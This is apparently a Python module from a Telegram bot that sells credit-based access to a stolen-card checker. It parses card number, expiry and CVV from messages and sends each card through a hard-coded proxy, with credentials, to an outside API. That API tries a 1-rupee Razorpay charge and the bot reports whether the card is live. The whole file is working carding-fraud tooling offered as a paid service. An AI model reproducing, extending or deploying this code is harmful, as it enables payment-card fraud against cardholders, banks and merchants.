import requests
import re
import random
import logging
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple
import asyncio
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import json
from bin import get_bin_info  # Import get_bin_info function from bin.py
from database import get_or_create_user, update_user_credits, get_user_credits  # Import database functions
from plans import get_user_current_tier # Import the correct function for tier checking

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# List of proxies to use randomly
PROXIES = [
    "http://25chilna:password@209.174.185.196:6226",
]

# API endpoint
API_URL = "https://autorz.nikhilkhokhar.com"

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16|931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16|931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

def get_random_proxy() -> str:
    """Get a random proxy from list."""
    return random.choice(PROXIES)

async def check_card(card_details: str, user_info: Dict) -> Optional[str]:
    """
    Check card details using Razorpay API asynchronously with aiohttp.
    Implements retry logic with up to 3 attempts if a request fails.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /rz card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Initialize variables for retry logic
    max_retries = 3
    retry_count = 0
    last_error = None
    api_response = None
    
    # Retry loop
    while retry_count < max_retries:
        try:
            # Get a random proxy for each attempt
            proxy = get_random_proxy()
            
            # Prepare API request parameters
            params = {
                "cc": f"{card_number}|{month}|{year}|{cvv}",
                "url": "https://razorpay.me/@ukinternational",
                "proxy": proxy,
                "amount": "100"
            }
            
            # Create an aiohttp session for async HTTP requests
            async with aiohttp.ClientSession() as session:
                # Make API request asynchronously
                async with session.get(API_URL, params=params, timeout=30) as response:
                    response.raise_for_status()
                    api_response = await response.json()
            
            # If we got a successful response, break out of the retry loop
            break
            
        except Exception as e:
            logger.error(f"Error checking card (attempt {retry_count + 1}): {e}")
            last_error = str(e)
            retry_count += 1
            
            # If this is not the last attempt, wait a bit before retrying
            if retry_count < max_retries:
                await asyncio.sleep(1)  # Wait 1 second before retrying
    
    # If all retries failed, return an error message
    if api_response is None:
        return f"⚠️ <b>Error checking card after {max_retries} attempts:</b> <code>{last_error}</code>"
    
    # Format and return the response
    return format_response(api_response, user_info, card_details, brand, issuer, country_name, country_flag)

def format_response(api_response: Dict, user_info: Dict, card_details: str, 
                   brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    """
    Format the API response into a beautiful message with emojis.
    Implements specific status logic based on response content.
    
    Args:
        api_response: Dictionary containing the API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        
    Returns:
        Formatted string with emojis
    """
    card = api_response.get("Card", "N/A")
    message = api_response.get("message", "N/A")
    status = api_response.get("status", "N/A")
    
    # Parse and clean the response message
    message = message.replace("\\", "").replace("/", "").replace("\"", "").replace("'", "")
    
    # Determine status based on message content with stylish formatting
    status_emoji = "❓"
    status_text = status
    status_style = ""
    
    # Check for specific conditions in order of priority
    
    # First check for insufficient_funds (should show as approved)
    if "insufficient_funds" in message.lower():
        status_emoji = "✅"
        status_text = "Approved/Charge"
        status_style = "<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙/𝘾𝙝𝙖𝙧𝙜𝙚</b> ✅"
    # Then check for decline, payment_risk_check_failed, or 3DS (should show as declined)
    elif any(keyword in message.lower() for keyword in ["decline", "bank_technical_error", "payment_risk_check_failed", "3d", "3ds"]):
        status_emoji = "❌"
        status_text = "Declined"
        status_style = "<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> ❌"
    # Check for other 3DS related messages (should show as declined)
    elif any(keyword in message.lower() for keyword in ["secure", "verification", "enrolled"]):
        status_emoji = "❌"
        status_text = "Declined"
        status_style = "<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> ❌"
    # Check for success messages
    elif any(keyword in message.lower() for keyword in ["thank", "success", "succeeded", "approved", "charged", "completed"]):
        status_emoji = "✅"
        status_text = "Approved/Charge"
        status_style = "<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙/𝘾𝙝𝙖𝙧𝙜𝙚</b> ✅"
    # Check for processing messages
    elif any(keyword in message.lower() for keyword in ["processing", "pending", "hold"]):
        status_emoji = "⏳"
        status_text = "Processing"
        status_style = "<b>𝙋𝙧𝙤𝙘𝙨𝙚𝙨𝙞𝙣𝙜</b> ⏳"
    # Default status
    else:
        status_style = f"{status_emoji} <b>{status_text}</b>"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/failfr'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 1₹</i>
<a href='https://t.me/failfr'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
{bank_part}
<a href='https://t.me/failfr'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/failfr'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/failfr'>kคli liຖนxx</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_rz_command(update, context):
    """
    Handle the /rz command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /rz card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /rz</i>", 
            parse_mode="HTML"
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/failfr'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/failfr'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/failfr'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/failfr'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML"
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 1₹</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await check_card(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>Error checking card:</b>"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n\n<a href='https://t.me/abtlnx'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            error_msg = f"⚠️ <b>Error:</b> <code>{str(e)}</code>"
            await checking_message.edit_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())

# Also add a handler for /rzz command as an alias
async def handle_rzz_command(update, context):
    """
    Handle the /rzz command as an alias for /rz.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Just call the rz handler
    await handle_rz_command(update, context)

if __name__ == "__main__":
    # For testing purposes
    test_card = "429619000071410|08|30|545"
    test_user = {
        "id": 123456789,
        "username": "testuser",
        "first_name": "Test"
    }
    asyncio.run(check_card(test_card, test_user))
